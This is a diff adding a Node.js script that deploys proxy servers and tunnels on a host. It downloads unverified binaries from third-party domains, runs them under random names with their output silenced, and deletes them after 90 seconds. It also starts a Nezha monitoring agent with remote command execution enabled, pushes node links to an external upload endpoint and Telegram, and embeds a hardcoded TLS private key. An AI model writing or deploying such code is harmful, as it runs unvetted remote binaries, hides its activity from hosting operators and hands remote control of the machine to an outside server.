+if (!fs.existsSync(FILE_PATH)) {
+  fs.mkdirSync(FILE_PATH);
+  // console.log(`${FILE_PATH} is created`);
+} else {
+  // console.log(`${FILE_PATH} already exists`);
+}
+
+// 端口检查
+function isValidPort(port) {
+  try {
+    if (port === null || port === undefined || port === '') return false;
+    if (typeof port === 'string' && port.trim() === '') return false;
+    const portNum = parseInt(port);
+    if (isNaN(portNum)) return false;
+    if (portNum < 1 || portNum > 65535) return false;
+    return true;
+  } catch (error) {
+    return false;
+  }
+}
+
+// 生成随机6位字符
+function generateRandomName() {
+  const characters = 'abcdefghijklmnopqrstuvwxyz';
+  let result = '';
+  for (let i = 0; i < 6; i++) {
+    result += characters.charAt(Math.floor(Math.random() * characters.length));
+  }
+  return result;
+}
+
+// 全局常量
+let subContent = null;
+let privateKey = '';
+let publicKey = '';
+const npmName = generateRandomName();
+const webName = generateRandomName();
+const botName = generateRandomName();
+const phpName = generateRandomName();
+let npmPath = path.join(FILE_PATH, npmName);
+let phpPath = path.join(FILE_PATH, phpName);
+let webPath = path.join(FILE_PATH, webName);
+let botPath = path.join(FILE_PATH, botName);
+let subPath = path.join(FILE_PATH, 'sub.txt');
+let listPath = path.join(FILE_PATH, 'list.txt');
+let bootLogPath = path.join(FILE_PATH, 'boot.log');
+let configPath = path.join(FILE_PATH, 'config.json');
+let certPath = path.resolve(FILE_PATH, 'cert.pem');
+let keyPath = path.resolve(FILE_PATH, 'private.key');
+
+// 如果订阅器上存在历史运行节点则先删除
+function deleteNodes() {
+  try {
+    if (!UPLOAD_URL) return;
+    if (!fs.existsSync(subPath)) return;
+
+    let fileContent;
+    try {
+      fileContent = fs.readFileSync(subPath, 'utf-8');
+    } catch {
+      return null;
+    }
+
+    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
+    const nodes = decoded.split('\n').filter(line =>
+      /(vless|vmess|trojan|hysteria2|socks):\/\//.test(line)
+    );
+
+    if (nodes.length === 0) return;
+
+    axios.post(`${UPLOAD_URL}/api/delete-nodes`,
+      JSON.stringify({ nodes }),
+      { headers: { 'Content-Type': 'application/json' } }
+    ).catch((error) => {
+      return null;
+    });
+    return null;
+  } catch (err) {
+    return null;
+  }
+}
+
+// 清理历史文件
+function cleanupOldFiles() {
+  try {
+    const files = fs.readdirSync(FILE_PATH);
+    files.forEach(file => {
+      const filePath = path.join(FILE_PATH, file);
+      try {
+        const stat = fs.statSync(filePath);
+        if (stat.isFile()) {
+          fs.unlinkSync(filePath);
+        }
+      } catch (err) {
+        // 忽略所有错误，不记录日志
+      }
+    });
+  } catch (err) {
+    // 忽略所有错误，不记录日志
+  }
+}
+
+// crypto 生成 X25519 密钥对
+function generateX25519Keypair() {
+  const { publicKey: pubKey, privateKey: privKey } = crypto.generateKeyPairSync('x25519');
+  const privateKeyRaw = privKey.export({ type: 'pkcs8', format: 'der' }).subarray(-32);
+  const publicKeyRaw = pubKey.export({ type: 'spki', format: 'der' }).subarray(-32);
+  return {
+    privateKey: privateKeyRaw.toString('base64url'),
+    publicKey: publicKeyRaw.toString('base64url')
+  };
+}
+
+// X25519 密钥对生成或加载
+function generateOrLoadKeyPair() {
+  const keyFilePath = path.join(FILE_PATH, 'key.txt');
+  if (fs.existsSync(keyFilePath)) {
+    const content = fs.readFileSync(keyFilePath, 'utf8');
+    const privateKeyMatch = content.match(/PrivateKey:\s*(.*)/);
+    const publicKeyMatch = content.match(/PublicKey:\s*(.*)/);
+    if (privateKeyMatch && publicKeyMatch) {
+      privateKey = privateKeyMatch[1].trim();
+      publicKey = publicKeyMatch[1].trim();
+      console.log('Private Key:', privateKey);
+      console.log('Public Key:', publicKey);
+      return;
+    }
+  }
+  const keypair = generateX25519Keypair();
+  privateKey = keypair.privateKey;
+  publicKey = keypair.publicKey;
+  fs.writeFileSync(keyFilePath, `PrivateKey: ${privateKey}\nPublicKey: ${publicKey}\n`, 'utf8');
+  console.log('Private Key:', privateKey);
+  console.log('Public Key:', publicKey);
+}
+
+// TLS 证书生成
+const FALLBACK_EC_KEY =
+  '-----BEGIN EC PARAMETERS-----\n' +
+  'BggqhkjOPQMBBw==\n' +
+  '-----END EC PARAMETERS-----\n' +
+  '-----BEGIN EC PRIVATE KEY-----\n' +
+  'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\n' +
+  'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\n' +
+  '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\n' +
+  '-----END EC PRIVATE KEY-----\n';
+
+const FALLBACK_CERT =
+  '-----BEGIN CERTIFICATE-----\n' +
+  'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\n' +
+  'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\n' +
+  'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\n' +
+  'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\n' +
+  'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\n' +
+  'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\n' +
+  'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\n' +
+  'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\n' +
+  '-----END CERTIFICATE-----\n';
+
+function ensureTlsCertificates(certPath, keyPath) {
+  if (fs.existsSync(certPath) && fs.existsSync(keyPath)) return;
+  fs.mkdirSync(path.dirname(certPath), { recursive: true });
+  try {
+    execSync('openssl version', { stdio: 'ignore' });
+    execSync(`openssl ecparam -genkey -name prime256v1 -out "${keyPath}"`, { stdio: 'ignore' });
+    execSync(`openssl req -new -x509 -days 3650 -key "${keyPath}" -out "${certPath}" -subj "/CN=bing.com"`, { stdio: 'ignore' });
+    return;
+  } catch (e) { /* openssl not available */ }
+  fs.writeFileSync(keyPath, FALLBACK_EC_KEY);
+  fs.writeFileSync(certPath, FALLBACK_CERT);
+}
+
+// 计算证书的 SHA-256 指纹，优先使用 openssl，不可用时用 Node.js crypto 兜底
+function getCertificateFingerprint(certPath) {
+  // 方案1: 优先用 openssl
+  try {
+    const result = execSync(
+      `openssl x509 -noout -fingerprint -sha256 -in "${certPath}"`,
+      { encoding: 'utf8', timeout: 3000 }
+    ).trim();
+    const match = result.match(/=(.+)$/);
+    if (match && match[1]) {
+      return match[1].toUpperCase();
+    }
+  } catch (e) {
+    // openssl 不可用，继续用 Node.js crypto
+  }
+
+  // 方案2: Node.js crypto 兜底
+  try {
+    const certData = fs.readFileSync(certPath, 'utf8');
+    const derMatch = certData.match(/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/);
+    if (!derMatch) return '';
+    const derBase64 = derMatch[1].replace(/\s/g, '');
+    const derBuffer = Buffer.from(derBase64, 'base64');
+    const hash = crypto.createHash('sha256').update(derBuffer).digest('hex');
+    return hash.match(/.{2}/g).join(':').toUpperCase();
+  } catch (error) {
+    console.error('Failed to calculate certificate fingerprint:', error);
+    return '';
+  }
+}
+
+// 生成xr-ay配置文件
+async function generateConfig() {
+  const config = {
+    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
+    inbounds: [
+      { tag: 'vless-fallback-in', port: ARGO_PORT, listen: '::', protocol: 'vless', settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
+      { tag: 'vless-tcp-in', port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
+      { tag: 'vless-ws-in', port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
+      { tag: 'vmess-ws-in', port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
+      { tag: 'trojan-ws-in', port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
+    ],
+    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
+    outbounds: [{ protocol: "freedom", tag: "direct" }, { protocol: "blackhole", tag: "block" }]
+  };
+
+  // VLESS Reality 配置
+  if (isValidPort(REALITY_PORT)) {
+    config.inbounds.push({
+      tag: "vless-in",
+      listen: "::",
+      port: parseInt(REALITY_PORT),
+      protocol: "vless",
+      settings: {
+        clients: [{ id: UUID, flow: "xtls-rprx-vision" }],
+        decryption: "none"
+      },
+      streamSettings: {
+        network: "raw",
+        security: "reality",
+        realitySettings: {
+          show: false,
+          dest: "www.iij.ad.jp:443",
+          xver: 0,
+          serverNames: ["www.iij.ad.jp"],
+          privateKey: privateKey,
+          shortIds: [""]
+        }
+      }
+    });
+  }
+
+  // Hysteria2 配置
+  if (isValidPort(HY2_PORT)) {
+    config.inbounds.push({
+      tag: "hysteria-in",
+      listen: "::",
+      port: parseInt(HY2_PORT),
+      protocol: "hysteria",
+      settings: {
+        version: 2,
+        clients: [{ auth: UUID }]
+      },
+      streamSettings: {
+        network: "hysteria",
+        hysteriaSettings: {
+          version: 2,
+          masquerade: {
+            type: "proxy",
+            url: "https://bing.com"
+          }
+        },
+        security: "tls",
+        tlsSettings: {
+          alpn: ["h3"],
+          certificates: [
+            {
+              certificateFile: certPath,
+              keyFile: keyPath
+            }
+          ]
+        }
+      }
+    });
+  }
+
+  // S5 配置
+  if (isValidPort(S5_PORT)) {
+    config.inbounds.push({
+      tag: "s5-in",
+      listen: "::",
+      port: parseInt(S5_PORT),
+      protocol: "socks",
+      settings: {
+        auth: "password",
+        accounts: [
+          {
+            user: UUID.substring(0, 8),
+            pass: UUID.slice(-12)
+          }
+        ],
+        udp: true
+      }
+    });
+  }
+
+  fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));
+}
+
+// 判断系统架构
+function getSystemArchitecture() {
+  const arch = os.arch();
+  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
+    return 'arm';
+  } else {
+    return 'amd';
+  }
+}
+
+// 下载对应系统架构的依赖文件
+function downloadFile(fileName, fileUrl, callback) {
+  const filePath = fileName;
+  const tempFilePath = `${filePath}.download`;
+
+  if (!fs.existsSync(FILE_PATH)) {
+    fs.mkdirSync(FILE_PATH, { recursive: true });
+  }
+
+  const writer = fs.createWriteStream(tempFilePath);
+
+  axios({
+    method: 'get',
+    url: fileUrl,
+    responseType: 'stream',
+  })
+    .then(response => {
+      response.data.pipe(writer);
+
+      writer.on('finish', () => {
+        writer.close((closeError) => {
+          if (closeError) {
+            const errorMessage = `Download ${path.basename(filePath)} failed: ${closeError.message}`;
+            fs.unlink(tempFilePath, () => { });
+            console.error(errorMessage);
+            callback(errorMessage);
+            return;
+          }
+          try {
+            fs.renameSync(tempFilePath, filePath);
+          } catch (renameError) {
+            const errorMessage = `Download ${path.basename(filePath)} failed: ${renameError.message}`;
+            fs.unlink(tempFilePath, () => { });
+            console.error(errorMessage);
+            callback(errorMessage);
+            return;
+          }
+          console.log(`Download ${path.basename(filePath)} successfully`);
+          callback(null, filePath);
+        });
+      });
+
+      writer.on('error', err => {
+        fs.unlink(tempFilePath, () => { });
+        const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
+        console.error(errorMessage);
+        callback(errorMessage);
+      });
+    })
+    .catch(err => {
+      fs.unlink(tempFilePath, () => { });
+      const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
+      console.error(errorMessage);
+      callback(errorMessage);
+    });
+}
+
+// 下载并运行依赖文件
+async function downloadFilesAndRun() {
+  const architecture = getSystemArchitecture();
+  const filesToDownload = getFilesForArchitecture(architecture);
+
+  if (filesToDownload.length === 0) {
+    console.log(`Can't find a file for the current architecture`);
+    return;
+  }
+
+  const downloadPromises = filesToDownload.map(fileInfo => {
+    return new Promise((resolve, reject) => {
+      const tryDownload = (urlIndex) => {
+        downloadFile(fileInfo.fileName, fileInfo.fileUrls[urlIndex], (err, filePath) => {
+          if (!err) {
+            resolve(filePath);
+            return;
+          }
+
+          if (urlIndex + 1 < fileInfo.fileUrls.length) {
+            console.log(`Retrying ${path.basename(fileInfo.fileName)} from backup source`);
+            tryDownload(urlIndex + 1);
+            return;
+          }
+
+          reject(err);
+        });
+      };
+
+      tryDownload(0);
+    });
+  });
+
+  try {
+    await Promise.all(downloadPromises);
+  } catch (err) {
+    console.error('Error downloading files:', err);
+    return;
+  }
+
+  function authorizeFiles(filePaths) {
+    const newPermissions = 0o775;
+    filePaths.forEach(absoluteFilePath => {
+      if (fs.existsSync(absoluteFilePath)) {
+        try {
+          fs.chmodSync(absoluteFilePath, newPermissions);
+          console.log(`Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`);
+        } catch (err) {
+          console.error(`Empowerment failed for ${absoluteFilePath}: ${err}`);
+        }
+      }
+    });
+  }
+  const filesToAuthorize = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath];
+  authorizeFiles(filesToAuthorize);
+
+  // 运行ne-zha
+  if (NEZHA_SERVER && NEZHA_KEY) {
+    if (!NEZHA_PORT) {
+      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
+      const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
+      const nezhatls = tlsPorts.has(port) ? 'true' : 'false';
+      const configYaml = `
+client_secret: ${NEZHA_KEY}
+debug: false
+disable_auto_update: true
+disable_command_execute: false
+disable_force_update: true
+disable_nat: false
+disable_send_query: false
+gpu: false
+insecure_tls: true
+ip_report_period: 1800
+report_delay: 4
+server: ${NEZHA_SERVER}
+skip_connection_count: true
+skip_procs_count: true
+temperature: false
+tls: ${nezhatls}
+use_gitee_to_upgrade: false
+use_ipv6_country_code: false
+uuid: ${UUID}`;
+
+      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
+
+      const command = `nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;
+      try {
+        await exec(command);
+        console.log(`${phpName} is running`);
+        await new Promise((resolve) => setTimeout(resolve, 1000));
+      } catch (error) {
+        console.error(`php running error: ${error}`);
+      }
+    } else {
+      let NEZHA_TLS = '';
+      const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
+      if (tlsPorts.includes(NEZHA_PORT)) {
+        NEZHA_TLS = '--tls';
+      }
+      const command = `nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
+      try {
+        await exec(command);
+        console.log(`${npmName} is running`);
+        await new Promise((resolve) => setTimeout(resolve, 1000));
+      } catch (error) {
+        console.error(`npm running error: ${error}`);
+      }
+    }
+  } else {
+    console.log('NEZHA variable is empty,skip running');
+  }
+
+  // 运行xr-ay
+  const command1 = `nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;
+  try {
+    await exec(command1);
+    console.log(`${webName} is running`);
+    await new Promise((resolve) => setTimeout(resolve, 1000));
+  } catch (error) {
+    console.error(`web running error: ${error}`);
+  }
+
+  // 运行cloud-fared
+  if (fs.existsSync(botPath)) {
+    let args;
+
+    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
+      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
+    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
+      args = `tunnel --edge-ip-version auto --config "${path.resolve(FILE_PATH, 'tunnel.yml')}" run`;
+    } else {
+      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile "${path.resolve(bootLogPath)}" --loglevel info --url http://localhost:${ARGO_PORT}`;
+    }
+
+    try {
+      await exec(`nohup "${path.resolve(botPath)}" ${args} >/dev/null 2>&1 &`);
+      console.log(`${botName} is running`);
+      await new Promise((resolve) => setTimeout(resolve, 2000));
+    } catch (error) {
+      console.error(`Error executing command: ${error}`);
+    }
+  }
+  await new Promise((resolve) => setTimeout(resolve, 5000));
+}
+
+// 根据系统架构返回对应的url
+function getFilesForArchitecture(architecture) {
+  const baseUrl = architecture === 'arm' ? 'https://arm64.oooen.com' : 'https://amd64.oooen.com';
+  const backupUrl = architecture === 'arm' ? 'https://arm64.ssss.nyc.mn' : 'https://amd64.ssss.nyc.mn';
+  const baseFiles = [
+    { fileName: webPath, fileUrls: [`${baseUrl}/web`, `${backupUrl}/web`] },
+    { fileName: botPath, fileUrls: [`${baseUrl}/bot`, `${backupUrl}/bot`] }
+  ];
+
+  if (NEZHA_SERVER && NEZHA_KEY) {
+    if (NEZHA_PORT) {
+      baseFiles.unshift({
+        fileName: npmPath,
+        fileUrls: [`${baseUrl}/agent`, `${backupUrl}/agent`]
+      });
+    } else {
+      baseFiles.unshift({
+        fileName: phpPath,
+        fileUrls: [`${baseUrl}/v1`, `${backupUrl}/v1`]
+      });
+    }
+  }
+
+  return baseFiles;
+}
+
+// 获取固定隧道json
+function argoType() {
+  if (!ARGO_AUTH || !ARGO_DOMAIN) {
+    console.log("ARGO_DOMAIN or ARGO_AUTH is empty, use quick tunnels");
+    return;
+  }
+
+  if (ARGO_AUTH.includes('TunnelSecret')) {
+    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), ARGO_AUTH);
+    const tunnelYaml = `
+  tunnel: ${ARGO_AUTH.split('"')[11]}
+  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
+  protocol: http2
+  
+  ingress:
+    - hostname: ${ARGO_DOMAIN}
+      service: http://localhost:${ARGO_PORT}
+      originRequest:
+        noTLSVerify: true
+    - service: http_status:404
+  `;
+    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
+  } else {
+    console.log(`Using token connect to tunnel, please set ${ARGO_PORT} in clouudflare`);
+  }
+}
+
+async function waitForQuickTunnelLog(timeoutMs = 30000) {
+  const deadline = Date.now() + timeoutMs;
+  while (Date.now() < deadline) {
+    try {
+      if (fs.existsSync(bootLogPath)) {
+        const content = fs.readFileSync(bootLogPath, 'utf-8');
+        if (/trycloudflare\.com/.test(content)) return content;
+      }
+    } catch (error) {
+      // 日志文件可能仍在创建中
+    }
+    await new Promise((resolve) => setTimeout(resolve, 1000));
+  }
+  return '';
+}
+
+// 获取临时隧道domain
+async function extractDomains() {
+  let argoDomain;
+
+  if (ARGO_AUTH && ARGO_DOMAIN) {
+    argoDomain = ARGO_DOMAIN;
+    console.log('ARGO_DOMAIN:', argoDomain);
+    await generateLinks(argoDomain);
+  } else {
+    try {
+      const fileContent = await waitForQuickTunnelLog();
+      const lines = fileContent.split('\n');
+      const argoDomains = [];
+      lines.forEach((line) => {
+        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
+        if (domainMatch) {
+          const domain = domainMatch[1];
+          argoDomains.push(domain);
+        }
+      });
+
+      if (argoDomains.length > 0) {
+        argoDomain = argoDomains[0];
+        console.log('ArgoDomain:', argoDomain);
+        await generateLinks(argoDomain);
+      } else {
+        console.log('ArgoDomain not found, re-running bot to obtain ArgoDomain');
+        fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
+        async function killBotProcess() {
+          try {
+            if (process.platform === 'win32') {
+              await exec(`taskkill /f /im ${botName}.exe > nul 2>&1`);
+            } else {
+              await exec(`pkill -f "[${botName.charAt(0)}]${botName.substring(1)}" > /dev/null 2>&1`);
+            }
+          } catch (error) {
+            // 忽略输出
+          }
+        }
+        killBotProcess();
+        await new Promise((resolve) => setTimeout(resolve, 3000));
+        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile "${path.resolve(bootLogPath)}" --loglevel info --url http://localhost:${ARGO_PORT}`;
+        try {
+          await exec(`nohup "${path.resolve(botPath)}" ${args} >/dev/null 2>&1 &`);
+          console.log(`${botName} is running`);
+          await new Promise((resolve) => setTimeout(resolve, 6000));
+          await extractDomains();
+        } catch (error) {
+          console.error(`Error executing command: ${error}`);
+        }
+      }
+    } catch (error) {
+      console.error('Error reading boot.log:', error);
+    }
+  }
+}
+
+// 获取isp信息
+async function getMetaInfo() {
+  try {
+    const response1 = await axios.get('https://api.ip.sb/geoip', { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 3000 } });
+    if (response1.data && response1.data.country_code && response1.data.isp) {
+      return `${response1.data.country_code}-${response1.data.isp}`.replace(/\s+/g, '_');
+    }
+  } catch (error) {
+    try {
+      const response2 = await axios.get('http://ip-api.com/json', { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 3000 } });
+      if (response2.data && response2.data.status === 'success' && response2.data.countryCode && response2.data.org) {
+        return `${response2.data.countryCode}-${response2.data.org}`.replace(/\s+/g, '_');
+      }
+    } catch (error) {
+      // console.error('Backup API also failed');
+    }
+  }
+  return 'Unknown';
+}
+
+// 获取服务器公网IP
+async function getServerIP() {
+  let serverIP = '';
+  try {
+    const ipv4Response = await axios.get('http://ipv4.ip.sb', { timeout: 3000 });
+    serverIP = ipv4Response.data.trim();
+  } catch (err) {
+    try {
+      serverIP = execSync('curl -sm 3 ipv4.ip.sb').toString().trim();
+    } catch (curlErr) {
+      try {
+        const ipv6Response = await axios.get('http://ipv6.ip.sb', { timeout: 3000 });
+        serverIP = `[${ipv6Response.data.trim()}]`;
+      } catch (ipv6AxiosErr) {
+        try {
+          serverIP = `[${execSync('curl -sm 3 ipv6.ip.sb').toString().trim()}]`;
+        } catch (ipv6CurlErr) {
+          console.error('Failed to get IP address:', ipv6CurlErr.message);
+        }
+      }
+    }
+  }
+  return serverIP;
+}
+
+// 生成 list 和 sub 信息
+async function generateLinks(argoDomain) {
+  const ISP = await getMetaInfo();
+  const nodeName = NAME ? `${NAME}-${ISP}` : ISP;
+  const SERVER_IP = await getServerIP();
+
+  return new Promise((resolve) => {
+    setTimeout(() => {
+      const VMESS = { v: '2', ps: `${nodeName}`, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'auto', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '', fp: 'firefox' };
+      let subTxt = `
+vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}
+
+vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}
+
+trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}
+    `;
+
+      // HY2_PORT是有效端口号时生成hysteria2节点
+      if (isValidPort(HY2_PORT)) {
+        const fingerprint = getCertificateFingerprint(certPath);
+        const fingerprintParam = fingerprint ? `&pinSHA256=${encodeURIComponent(fingerprint)}` : '';
+        const hysteriaNode = `\nhysteria2://${UUID}@${SERVER_IP}:${HY2_PORT}/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none${fingerprintParam}#${nodeName}`;
+        subTxt += hysteriaNode;
+      }
+
+      // REALITY_PORT是有效端口号时生成reality节点
+      if (isValidPort(REALITY_PORT)) {
+        const vlessNode = `\nvless://${UUID}@${SERVER_IP}:${REALITY_PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=${publicKey}&type=tcp&headerType=none#${nodeName}`;
+        subTxt += vlessNode;
+      }
+
+      // S5_PORT是有效端口号时生成socks5节点
+      if (isValidPort(S5_PORT)) {
+        const S5_AUTH = Buffer.from(`${UUID.substring(0, 8)}:${UUID.slice(-12)}`).toString('base64');
+        const s5Node = `\nsocks://${S5_AUTH}@${SERVER_IP}:${S5_PORT}#${nodeName}`;
+        subTxt += s5Node;
+      }
+
+      console.log(Buffer.from(subTxt).toString('base64'));
+      fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
+      fs.writeFileSync(listPath, subTxt, 'utf8');
+      console.log(`${FILE_PATH}/sub.txt saved successfully`);
+      // 将订阅内容保存到全局变量，供 http 服务器使用
+      subContent = Buffer.from(subTxt).toString('base64');
+      uploadNodes();
+      resolve(subTxt);
+    }, 2000);
+  });
+}
+
+// 自动上传节点或订阅
+async function uploadNodes() {
+  if (UPLOAD_URL && PROJECT_URL) {
+    const subscriptionUrl = `${PROJECT_URL}/${SUB_PATH}`;
+    const jsonData = {
+      subscription: [subscriptionUrl]
+    };
+    try {
+      const response = await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, jsonData, {
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      });
+
+      if (response && response.status === 200) {
+        console.log('Subscription uploaded successfully');
+        return response;
+      } else {
+        return null;
+      }
+    } catch (error) {
+      if (error.response) {
+        if (error.response.status === 400) {
+          // console.error('Subscription already exists');
+        }
+      }
+    }
+  } else if (UPLOAD_URL) {
+    if (!fs.existsSync(listPath)) return;
+    const content = fs.readFileSync(listPath, 'utf-8');
+    const nodes = content.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|socks):\/\//.test(line));
+
+    if (nodes.length === 0) return;
+
+    const jsonData = JSON.stringify({ nodes });
+
+    try {
+      const response = await axios.post(`${UPLOAD_URL}/api/add-nodes`, jsonData, {
+        headers: { 'Content-Type': 'application/json' }
+      });
+      if (response && response.status === 200) {
+        console.log('Nodes uploaded successfully');
+        return response;
+      } else {
+        return null;
+      }
+    } catch (error) {
+      return null;
+    }
+  } else {
+    // console.log('Skipping upload nodes');
+    return;
+  }
+}
+
+// 90s后删除相关文件
+function cleanFiles() {
+  setTimeout(() => {
+    const filesToDelete = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath];
+
+    if (NEZHA_PORT) {
+      filesToDelete.push(npmPath);
+    } else if (NEZHA_SERVER && NEZHA_KEY) {
+      filesToDelete.push(phpPath);
+    }
+
+    if (process.platform === 'win32') {
+      exec(`del /f /q ${filesToDelete.join(' ')} > nul 2>&1`, (error) => {
+        console.clear();
+        alwaysLog('App is running');
+        console.log('Thank you for using this script, enjoy!');
+      });
+    } else {
+      exec(`rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`, (error) => {
+        console.clear();
+        alwaysLog('App is running');
+        console.log('Thank you for using this script, enjoy!');
+      });
+    }
+  }, 90000);
+}
+cleanFiles();
+
+// Telegram 推送节点
+async function sendTelegram() {
+  if (!BOT_TOKEN || !CHAT_ID) {
+    console.log('TG variables is empty, Skipping push nodes to TG');
+    return;
+  }
+  try {
+    const message = fs.readFileSync(subPath, 'utf8');
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const escapedName = NAME.replace(/[_*\[\]()~`>#+=|{}.!-]/g, '\\$&');
+    const params = {
+      chat_id: CHAT_ID,
+      text: `**${escapedName}节点推送**\n\`\`\`${message}\`\`\``,
+      parse_mode: 'MarkdownV2'
+    };
+    await axios.post(url, null, { params });
+    console.log('Telegram message sent successfully');
+  } catch (error) {
+    console.error('Failed to send Telegram message:', error.message);
+  }
+}
+
+// 自动访问项目URL
+async function AddVisitTask() {
+  if (!AUTO_ACCESS || !PROJECT_URL) {
+    console.log("Skipping adding automatic access task");
+    return;
+  }
+
+  try {
+    const response = await axios.post('https://oooo.serv00.net/add-url', {
+      url: PROJECT_URL
+    }, {
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    });
+    console.log(`automatic access task added successfully`);
+    return response;
+  } catch (error) {
+    console.error(`Add automatic access task faild: ${error.message}`);
+    return null;
+  }
+}
+
+// 主运行逻辑
+async function startserver() {
+  try {
+    argoType();
+    deleteNodes();
+    cleanupOldFiles();
+
+    // 生成 Reality 密钥对 (仅当 REALITY_PORT 开启才生成)
+    if (isValidPort(REALITY_PORT)) {
+      generateOrLoadKeyPair();
+    }
+
+    // 生成 TLS 证书 (用于 Hysteria2)
+    if (isValidPort(HY2_PORT)) {
+      ensureTlsCertificates(certPath, keyPath);
+    }
+
+    await generateConfig();
+    await downloadFilesAndRun();
+    await extractDomains();
+    await sendTelegram();
+    await AddVisitTask();
+  } catch (error) {
+    console.error('Error in startserver:', error);
+  }
+}
+startserver().catch(error => {
+  console.error('Unhandled error in startserver:', error);
+});
+
+// 创建 http 服务器
+const server = http.createServer(async (req, res) => {
+  const urlPath = req.url.split('?')[0];
+
+  // 订阅路由
+  if (urlPath === `/${SUB_PATH}`) {
+    if (subContent) {
+      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
+      res.end(subContent);
+    } else {
+      try {
+        const fileContent = fs.readFileSync(subPath, 'utf-8');
